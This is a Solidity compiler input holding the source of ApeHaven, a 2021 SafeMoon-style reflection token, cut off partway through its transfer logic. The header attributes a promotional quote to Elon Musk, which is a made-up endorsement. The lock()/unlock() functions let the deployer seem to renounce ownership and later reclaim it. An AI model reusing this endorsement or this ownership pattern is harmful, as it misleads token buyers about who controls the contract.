{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "github/apehaven/contract/contract.sol": {
      "content": "/**\n *Submitted for verification at EtherScan.com on 2021-04-28\n*/\n\n/**\n *\n *\n\n   \"$APES to the moon\" -Elon Musk\n\n   Contract features:\n   7% fee auto added to the liquidity pool and locked forever\n   2% fee auto distributed to all holders\n   1% fee sent to charity wallet\n\n */\n\npragma solidity ^0.6.12;\n// SPDX-License-Identifier: Unlicensed\ninterface IERC20 {\n\t\n\tfunction totalSupply() external view returns (uint256);\n\t\n\t/**\n\t * @dev Returns the amount of tokens owned by `account`.\n\t */\n\tfunction balanceOf(address account) external view returns (uint256);\n\t\n\t/**\n\t * @dev Moves `amount` tokens from the caller's account to `recipient`.\n\t *\n\t * Returns a boolean value indicating whether the operation succeeded.\n\t *\n\t * Emits a {Transfer} event.\n\t */\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\n\t\n\t/**\n\t * @dev Returns the remaining number of tokens that `spender` will be\n\t * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\t * zero by default.\n\t *\n\t * This value changes when {approve} or {transferFrom} are called.\n\t */\n\tfunction allowance(address owner, address spender) external view returns (uint256);\n\t\n\t/**\n\t * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n\t *\n\t * Returns a boolean value indicating whether the operation succeeded.\n\t *\n\t * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\t * that someone may use both the old and the new allowance by unfortunate\n\t * transaction ordering. One possible solution to mitigate this race\n\t * condition is to first reduce the spender's allowance to 0 and set the\n\t * desired value afterwards:\n\t * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\t *\n\t * Emits an {Approval} event.\n\t */\n\tfunction approve(address spender, uint256 amount) external returns (bool);\n\t\n\t/**\n\t * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\t * allowance mechanism. `amount` is then deducted from the caller's\n\t * allowance.\n\t *\n\t * Returns a boolean value indicating whether the operation succeeded.\n\t *\n\t * Emits a {Transfer} event.\n\t */\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\t\n\t/**\n\t * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\t * another (`to`).\n\t *\n\t * Note that `value` may be zero.\n\t */\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\n\t\n\t/**\n\t * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\t * a call to {approve}. `value` is the new allowance.\n\t */\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\n\nlibrary SafeMath {\n\t/**\n\t * @dev Returns the addition of two unsigned integers, reverting on\n\t * overflow.\n\t *\n\t * Counterpart to Solidity's `+` operator.\n\t *\n\t * Requirements:\n\t *\n\t * - Addition cannot overflow.\n\t */\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\tuint256 c = a + b;\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\n\t\t\n\t\treturn c;\n\t}\n\t\n\t/**\n\t * @dev Returns the subtraction of two unsigned integers, reverting on\n\t * overflow (when the result is negative).\n\t *\n\t * Counterpart to Solidity's `-` operator.\n\t *\n\t * Requirements:\n\t *\n\t * - Subtraction cannot overflow.\n\t */\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\n\t}\n\t\n\t/**\n\t * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\t * overflow (when the result is negative).\n\t *\n\t * Counterpart to Solidity's `-` operator.\n\t *\n\t * Requirements:\n\t *\n\t * - Subtraction cannot overflow.\n\t */\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b <= a, errorMessage);\n\t\tuint256 c = a - b;\n\t\t\n\t\treturn c;\n\t}\n\t\n\t/**\n\t * @dev Returns the multiplication of two unsigned integers, reverting on\n\t * overflow.\n\t *\n\t * Counterpart to Solidity's `*` operator.\n\t *\n\t * Requirements:\n\t *\n\t * - Multiplication cannot overflow.\n\t */\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\t// Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n\t\t// benefit is lost if 'b' is also tested.\n\t\t// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\t\tif (a == 0) {\n\t\t\treturn 0;\n\t\t}\n\t\t\n\t\tuint256 c = a * b;\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\n\t\t\n\t\treturn c;\n\t}\n\t\n\t/**\n\t * @dev Returns the integer division of two unsigned integers. Reverts on\n\t * division by zero. The result is rounded towards zero.\n\t *\n\t * Counterpart to Solidity's `/` operator. Note: this function uses a\n\t * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\t * uses an invalid opcode to revert (consuming all remaining gas).\n\t *\n\t * Requirements:\n\t *\n\t * - The divisor cannot be zero.\n\t */\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn div(a, b, \"SafeMath: division by zero\");\n\t}\n\t\n\t/**\n\t * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\t * division by zero. The result is rounded towards zero.\n\t *\n\t * Counterpart to Solidity's `/` operator. Note: this function uses a\n\t * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\t * uses an invalid opcode to revert (consuming all remaining gas).\n\t *\n\t * Requirements:\n\t *\n\t * - The divisor cannot be zero.\n\t */\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b > 0, errorMessage);\n\t\tuint256 c = a / b;\n\t\t// assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\t\t\n\t\treturn c;\n\t}\n\t\n\t/**\n\t * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\t * Reverts when dividing by zero.\n\t *\n\t * Counterpart to Solidity's `%` operator. This function uses a `revert`\n\t * opcode (which leaves remaining gas untouched) while Solidity uses an\n\t * invalid opcode to revert (consuming all remaining gas).\n\t *\n\t * Requirements:\n\t *\n\t * - The divisor cannot be zero.\n\t */\n\tfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn mod(a, b, \"SafeMath: modulo by zero\");\n\t}\n\t\n\t/**\n\t * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\t * Reverts with custom message when dividing by zero.\n\t *\n\t * Counterpart to Solidity's `%` operator. This function uses a `revert`\n\t * opcode (which leaves remaining gas untouched) while Solidity uses an\n\t * invalid opcode to revert (consuming all remaining gas).\n\t *\n\t * Requirements:\n\t *\n\t * - The divisor cannot be zero.\n\t */\n\tfunction mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b != 0, errorMessage);\n\t\treturn a % b;\n\t}\n}\n\nabstract contract Context {\n\tfunction _msgSender() internal view virtual returns (address payable) {\n\t\treturn msg.sender;\n\t}\n\t\n\tfunction _msgData() internal view virtual returns (bytes memory) {\n\t\tthis;\n\t\t// silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\t\treturn msg.data;\n\t}\n}\n\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n\t/**\n\t * @dev Returns true if `account` is a contract.\n\t *\n\t * [IMPORTANT]\n\t * ====\n\t * It is unsafe to assume that an address for which this function returns\n\t * false is an externally-owned account (EOA) and not a contract.\n\t *\n\t * Among others, `isContract` will return false for the following\n\t * types of addresses:\n\t *\n\t *  - an externally-owned account\n\t *  - a contract in construction\n\t *  - an address where a contract will be created\n\t *  - an address where a contract lived, but was destroyed\n\t * ====\n\t */\n\tfunction isContract(address account) internal view returns (bool) {\n\t\t// According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n\t\t// and  is returned\n\t\t// for accounts without code, i.e. `keccak256('')`\n\t\tbytes32 codehash;\n\t\tbytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n\t\t// solhint-disable-next-line no-inline-assembly\n\t\tassembly {codehash := extcodehash(account)}\n\t\treturn (codehash != accountHash && codehash != 0x0);\n\t}\n\t\n\t/**\n\t * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n\t * `recipient`, forwarding all available gas and reverting on errors.\n\t *\n\t * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n\t * of certain opcodes, possibly making contracts go over the 2300 gas limit\n\t * imposed by `transfer`, making them unable to receive funds via\n\t * `transfer`. {sendValue} removes this limitation.\n\t *\n\t * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n\t *\n\t * IMPORTANT: because control is transferred to `recipient`, care must be\n\t * taken to not create reentrancy vulnerabilities. Consider using\n\t * {ReentrancyGuard} or the\n\t * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n\t */\n\tfunction sendValue(address payable recipient, uint256 amount) internal {\n\t\trequire(address(this).balance >= amount, \"Address: insufficient balance\");\n\t\t\n\t\t// solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n\t\t(bool success,) = recipient.call{value : amount}(\"\");\n\t\trequire(success, \"Address: unable to send value, recipient may have reverted\");\n\t}\n\t\n\t/**\n\t * @dev Performs a Solidity function call using a low level `call`. A\n\t * plain`call` is an unsafe replacement for a function call: use this\n\t * function instead.\n\t *\n\t * If `target` reverts with a revert reason, it is bubbled up by this\n\t * function (like regular Solidity function calls).\n\t *\n\t * Returns the raw returned data. To convert to the expected return value,\n\t * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n\t *\n\t * Requirements:\n\t *\n\t * - `target` must be a contract.\n\t * - calling `target` with `data` must not revert.\n\t *\n\t * _Available since v3.1._\n\t */\n\tfunction functionCall(address target, bytes memory data) internal returns (bytes memory) {\n\t\treturn functionCall(target, data, \"Address: low-level call failed\");\n\t}\n\t\n\t/**\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n\t * `errorMessage` as a fallback revert reason when `target` reverts.\n\t *\n\t * _Available since v3.1._\n\t */\n\tfunction functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n\t\treturn _functionCallWithValue(target, data, 0, errorMessage);\n\t}\n\t\n\t/**\n\t * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n\t * but also transferring `value` wei to `target`.\n\t *\n\t * Requirements:\n\t *\n\t * - the calling contract must have an ETH balance of at least `value`.\n\t * - the called Solidity function must be `payable`.\n\t *\n\t * _Available since v3.1._\n\t */\n\tfunction functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n\t\treturn functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n\t}\n\t\n\t/**\n\t * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n\t * with `errorMessage` as a fallback revert reason when `target` reverts.\n\t *\n\t * _Available since v3.1._\n\t */\n\tfunction functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n\t\trequire(address(this).balance >= value, \"Address: insufficient balance for call\");\n\t\treturn _functionCallWithValue(target, data, value, errorMessage);\n\t}\n\t\n\tfunction _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n\t\trequire(isContract(target), \"Address: call to non-contract\");\n\t\t\n\t\t// solhint-disable-next-line avoid-low-level-calls\n\t\t(bool success, bytes memory returndata) = target.call{value : weiValue}(data);\n\t\tif (success) {\n\t\t\treturn returndata;\n\t\t} else {\n\t\t\t// Look for revert reason and bubble it up if present\n\t\t\tif (returndata.length > 0) {\n\t\t\t\t// The easiest way to bubble the revert reason is using memory via assembly\n\t\t\t\t\n\t\t\t\t// solhint-disable-next-line no-inline-assembly\n\t\t\t\tassembly {\n\t\t\t\t\tlet returndata_size := mload(returndata)\n\t\t\t\t\trevert(add(32, returndata), returndata_size)\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\trevert(errorMessage);\n\t\t\t}\n\t\t}\n\t}\n}\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * By default, the owner account will be the one that deploys the contract. This\n * can later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\ncontract Ownable is Context {\n\taddress private _owner;\n\taddress private _previousOwner;\n\tuint256 private _lockTime;\n\t\n\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\t\n\t/**\n\t * @dev Initializes the contract setting the deployer as the initial owner.\n\t */\n\tconstructor () internal {\n\t\taddress msgSender = _msgSender();\n\t\t_owner = msgSender;\n\t\temit OwnershipTransferred(address(0), msgSender);\n\t}\n\t\n\t/**\n\t * @dev Returns the address of the current owner.\n\t */\n\tfunction owner() public view returns (address) {\n\t\treturn _owner;\n\t}\n\t\n\t/**\n\t * @dev Throws if called by any account other than the owner.\n\t */\n\tmodifier onlyOwner() {\n\t\trequire(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n\t\t_;\n\t}\n\t\n\t/**\n\t* @dev Leaves the contract without owner. It will not be possible to call\n\t* `onlyOwner` functions anymore. Can only be called by the current owner.\n\t*\n\t* NOTE: Renouncing ownership will leave the contract without an owner,\n\t* thereby removing any functionality that is only available to the owner.\n\t*/\n\tfunction renounceOwnership() public virtual onlyOwner {\n\t\temit OwnershipTransferred(_owner, address(0));\n\t\t_owner = address(0);\n\t}\n\t\n\t/**\n\t * @dev Transfers ownership of the contract to a new account (`newOwner`).\n\t * Can only be called by the current owner.\n\t */\n\tfunction transferOwnership(address newOwner) public virtual onlyOwner {\n\t\trequire(newOwner != address(0), \"Ownable: new owner is the zero address\");\n\t\temit OwnershipTransferred(_owner, newOwner);\n\t\t_owner = newOwner;\n\t}\n\t\n\tfunction geUnlockTime() public view returns (uint256) {\n\t\treturn _lockTime;\n\t}\n\t\n\t//Locks the contract for owner for the amount of time provided\n\tfunction lock(uint256 time) public virtual onlyOwner {\n\t\t_previousOwner = _owner;\n\t\t_owner = address(0);\n\t\t_lockTime = now + time;\n\t\temit OwnershipTransferred(_owner, address(0));\n\t}\n\t\n\t//Unlocks the contract for owner when _lockTime is exceeds\n\tfunction unlock() public virtual {\n\t\trequire(_previousOwner == msg.sender, \"You don't have permission to unlock\");\n\t\trequire(now > _lockTime, \"Contract is locked until 7 days\");\n\t\temit OwnershipTransferred(_owner, _previousOwner);\n\t\t_owner = _previousOwner;\n\t}\n}\n\n// pragma solidity >=0.5.0;\n\ninterface IUniswapV2Factory {\n\tevent PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\t\n\tfunction feeTo() external view returns (address);\n\t\n\tfunction feeToSetter() external view returns (address);\n\t\n\tfunction getPair(address tokenA, address tokenB) external view returns (address pair);\n\t\n\tfunction allPairs(uint) external view returns (address pair);\n\t\n\tfunction allPairsLength() external view returns (uint);\n\t\n\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\n\t\n\tfunction setFeeTo(address) external;\n\t\n\tfunction setFeeToSetter(address) external;\n}\n\n\n// pragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n\tevent Approval(address indexed owner, address indexed spender, uint value);\n\tevent Transfer(address indexed from, address indexed to, uint value);\n\t\n\tfunction name() external pure returns (string memory);\n\t\n\tfunction symbol() external pure returns (string memory);\n\t\n\tfunction decimals() external pure returns (uint8);\n\t\n\tfunction totalSupply() external view returns (uint);\n\t\n\tfunction balanceOf(address owner) external view returns (uint);\n\t\n\tfunction allowance(address owner, address spender) external view returns (uint);\n\t\n\tfunction approve(address spender, uint value) external returns (bool);\n\t\n\tfunction transfer(address to, uint value) external returns (bool);\n\t\n\tfunction transferFrom(address from, address to, uint value) external returns (bool);\n\t\n\tfunction DOMAIN_SEPARATOR() external view returns (bytes32);\n\t\n\tfunction PERMIT_TYPEHASH() external pure returns (bytes32);\n\t\n\tfunction nonces(address owner) external view returns (uint);\n\t\n\tfunction permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\t\n\tevent Mint(address indexed sender, uint amount0, uint amount1);\n\tevent Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n\tevent Swap(\n\t\taddress indexed sender,\n\t\tuint amount0In,\n\t\tuint amount1In,\n\t\tuint amount0Out,\n\t\tuint amount1Out,\n\t\taddress indexed to\n\t);\n\tevent Sync(uint112 reserve0, uint112 reserve1);\n\t\n\tfunction MINIMUM_LIQUIDITY() external pure returns (uint);\n\t\n\tfunction factory() external view returns (address);\n\t\n\tfunction token0() external view returns (address);\n\t\n\tfunction token1() external view returns (address);\n\t\n\tfunction getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n\t\n\tfunction price0CumulativeLast() external view returns (uint);\n\t\n\tfunction price1CumulativeLast() external view returns (uint);\n\t\n\tfunction kLast() external view returns (uint);\n\t\n\tfunction mint(address to) external returns (uint liquidity);\n\t\n\tfunction burn(address to) external returns (uint amount0, uint amount1);\n\t\n\tfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n\t\n\tfunction skim(address to) external;\n\t\n\tfunction sync() external;\n\t\n\tfunction initialize(address, address) external;\n}\n\n// pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router01 {\n\tfunction factory() external pure returns (address);\n\t\n\tfunction WETH() external pure returns (address);\n\t\n\tfunction addLiquidity(\n\t\taddress tokenA,\n\t\taddress tokenB,\n\t\tuint amountADesired,\n\t\tuint amountBDesired,\n\t\tuint amountAMin,\n\t\tuint amountBMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint amountA, uint amountB, uint liquidity);\n\t\n\tfunction addLiquidityETH(\n\t\taddress token,\n\t\tuint amountTokenDesired,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n\t\n\tfunction removeLiquidity(\n\t\taddress tokenA,\n\t\taddress tokenB,\n\t\tuint liquidity,\n\t\tuint amountAMin,\n\t\tuint amountBMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint amountA, uint amountB);\n\t\n\tfunction removeLiquidityETH(\n\t\taddress token,\n\t\tuint liquidity,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint amountToken, uint amountETH);\n\t\n\tfunction removeLiquidityWithPermit(\n\t\taddress tokenA,\n\t\taddress tokenB,\n\t\tuint liquidity,\n\t\tuint amountAMin,\n\t\tuint amountBMin,\n\t\taddress to,\n\t\tuint deadline,\n\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n\t) external returns (uint amountA, uint amountB);\n\t\n\tfunction removeLiquidityETHWithPermit(\n\t\taddress token,\n\t\tuint liquidity,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline,\n\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n\t) external returns (uint amountToken, uint amountETH);\n\t\n\tfunction swapExactTokensForTokens(\n\t\tuint amountIn,\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint[] memory amounts);\n\t\n\tfunction swapTokensForExactTokens(\n\t\tuint amountOut,\n\t\tuint amountInMax,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint[] memory amounts);\n\t\n\tfunction swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n\texternal\n\tpayable\n\treturns (uint[] memory amounts);\n\t\n\tfunction swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n\texternal\n\treturns (uint[] memory amounts);\n\t\n\tfunction swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n\texternal\n\treturns (uint[] memory amounts);\n\t\n\tfunction swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n\texternal\n\tpayable\n\treturns (uint[] memory amounts);\n\t\n\tfunction quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n\t\n\tfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n\t\n\tfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n\t\n\tfunction getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n\t\n\tfunction getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n\n\n\n// pragma solidity >=0.6.2;\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n\tfunction removeLiquidityETHSupportingFeeOnTransferTokens(\n\t\taddress token,\n\t\tuint liquidity,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external returns (uint amountETH);\n\t\n\tfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n\t\taddress token,\n\t\tuint liquidity,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline,\n\t\tbool approveMax, uint8 v, bytes32 r, bytes32 s\n\t) external returns (uint amountETH);\n\t\n\tfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(\n\t\tuint amountIn,\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external;\n\t\n\tfunction swapExactETHForTokensSupportingFeeOnTransferTokens(\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external payable;\n\t\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\tuint amountIn,\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external;\n}\n\n\ncontract ApeHaven is Context, IERC20, Ownable {\n\tusing SafeMath for uint256;\n\tusing Address for address;\n\t\n\tmapping(address => uint256) private _rOwned;\n\tmapping(address => uint256) private _tOwned;\n\tmapping(address => mapping(address => uint256)) private _allowances;\n\t\n\tmapping(address => bool) private _isExcludedFromFee;\n\t\n\tmapping(address => bool) private _isExcluded;\n\taddress[] private _excluded;\n\t\n\tuint256 private constant MAX = ~uint256(0);\n\tuint256 private _tTotal = 1000000000 * 10** 18;\n\tuint256 private _rTotal = (MAX - (MAX % _tTotal));\n\tuint256 private _tFeeTotal;\n\t\n\tstring private _name = \"ApeHaven\";\n\tstring private _symbol = \"APES\";\n\tuint8 private _decimals = 18;\n\t\n\tuint256 public _taxFee = 2;\n\tuint256 private _previousTaxFee = _taxFee;\n\t\n\tuint256 public _devFee = 1; // 1% to charity wallet\n\tuint256 private _previousDevFee = _devFee;\n\taddress public charityWallet = address(0x7c87DdAc05c5146876cc0f9e335ce125B15d6893); // Donated to the Center for Great Apes\n\t\n\tuint256 public _liquidityFee = 7;\n\tuint256 private _previousLiquidityFee = _liquidityFee;\n\t\n\tIUniswapV2Router02 public immutable uniswapV2Router;\n\taddress public immutable uniswapV2Pair;\n\t\n\tbool public inSwapAndLiquify;\n\tbool public swapAndLiquifyEnabled = true;\n\t\n\tuint256 public _maxTxAmount = 1000000000 * 10**18;\n\tuint256 public numTokensSellToAddToLiquidity = 200000 * 10**18;\n\tuint256 public _maxWalletToken = 1000000000 * 10**18; // 0.25% of total supply after burn\n\t\n\tuint256 deployedAtBlock;\n\t\n\t\n\tevent MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);\n\tevent SwapAndLiquifyEnabledUpdated(bool enabled);\n\tevent SwapAndLiquify(\n\t\tuint256 tokensSwapped,\n\t\tuint256 ethReceived,\n\t\tuint256 tokensIntoLiqudity\n\t);\n\t\n\tmodifier lockTheSwap {\n\t\tinSwapAndLiquify = true;\n\t\t_;\n\t\tinSwapAndLiquify = false;\n\t}\n\t\n\tconstructor () public {\n\t\t_rOwned[_msgSender()] = _rTotal;\n\t\t\n\t\tIUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n\t\t// Create a uniswap pair for this new token\n\t\tuniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())\n\t\t.createPair(address(this), _uniswapV2Router.WETH());\n\t\t\n\t\t// set the rest of the contract variables\n\t\tuniswapV2Router = _uniswapV2Router;\n\t\tdeployedAtBlock = block.number;\n\t\t\n\t\t//exclude owner and this contract from fee\n\t\t_isExcludedFromFee[owner()] = true;\n\t\t_isExcludedFromFee[address(this)] = true;\n\t\t\n\t\temit Transfer(address(0), _msgSender(), _tTotal);\n\t}\n\t\n\tfunction name() public view returns (string memory) {\n\t\treturn _name;\n\t}\n\t\n\tfunction symbol() public view returns (string memory) {\n\t\treturn _symbol;\n\t}\n\t\n\tfunction decimals() public view returns (uint8) {\n\t\treturn _decimals;\n\t}\n\t\n\tfunction totalSupply() public view override returns (uint256) {\n\t\treturn _tTotal;\n\t}\n\t\n\tfunction balanceOf(address account) public view override returns (uint256) {\n\t\tif (_isExcluded[account]) return _tOwned[account];\n\t\treturn tokenFromReflection(_rOwned[account]);\n\t}\n\t\n\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(_msgSender(), recipient, amount);\n\t\treturn true;\n\t}\n\t\n\tfunction allowance(address owner, address spender) public view override returns (uint256) {\n\t\treturn _allowances[owner][spender];\n\t}\n\t\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\n\t\t_approve(_msgSender(), spender, amount);\n\t\treturn true;\n\t}\n\t\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(sender, recipient, amount);\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n\t\treturn true;\n\t}\n\t\n\tfunction increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n\t\treturn true;\n\t}\n\t\n\tfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n\t\treturn true;\n\t}\n\t\n\tfunction isExcludedFromReward(address account) public view returns (bool) {\n\t\treturn _isExcluded[account];\n\t}\n\t\n\tfunction totalFees() public view returns (uint256) {\n\t\treturn _tFeeTotal;\n\t}\n\t\n\tfunction deliver(uint256 tAmount) public {\n\t\taddress sender = _msgSender();\n\t\trequire(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n\t\t(uint256 rAmount,,,,,) = _getValues(tAmount);\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n\t\t_rTotal = _rTotal.sub(rAmount);\n\t\t_tFeeTotal = _tFeeTotal.add(tAmount);\n\t}\n\t\n\tfunction reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns (uint256) {\n\t\trequire(tAmount <= _tTotal, \"Amount must be less than supply\");\n\t\tif (!deductTransferFee) {\n\t\t\t(uint256 rAmount,,,,,) = _getValues(tAmount);\n\t\t\treturn rAmount;\n\t\t} else {\n\t\t\t(,uint256 rTransferAmount,,,,) = _getValues(tAmount);\n\t\t\treturn rTransferAmount;\n\t\t}\n\t}\n\t\n\tfunction tokenFromReflection(uint256 rAmount) public view returns (uint256) {\n\t\trequire(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n\t\tuint256 currentRate = _getRate();\n\t\treturn rAmount.div(currentRate);\n\t}\n\t\n\tfunction excludeFromReward(address account) public onlyOwner() {\n\t\t// require(account != , 'We can not exclude Uniswap router.');\n\t\trequire(!_isExcluded[account], \"Account is already excluded\");\n\t\tif (_rOwned[account] > 0) {\n\t\t\t_tOwned[account] = tokenFromReflection(_rOwned[account]);\n\t\t}\n\t\t_isExcluded[account] = true;\n\t\t_excluded.push(account);\n\t}\n\t\n\tfunction includeInReward(address account) external onlyOwner() {\n\t\trequire(_isExcluded[account], \"Account is already excluded\");\n\t\tfor (uint256 i = 0; i < _excluded.length; i++) {\n\t\t\tif (_excluded[i] == account) {\n\t\t\t\t_excluded[i] = _excluded[_excluded.length - 1];\n\t\t\t\t_tOwned[account] = 0;\n\t\t\t\t_isExcluded[account] = false;\n\t\t\t\t_excluded.pop();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t\n\tfunction _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n\t\t_tOwned[sender] = _tOwned[sender].sub(tAmount);\n\t\t_rOwned[sender] = 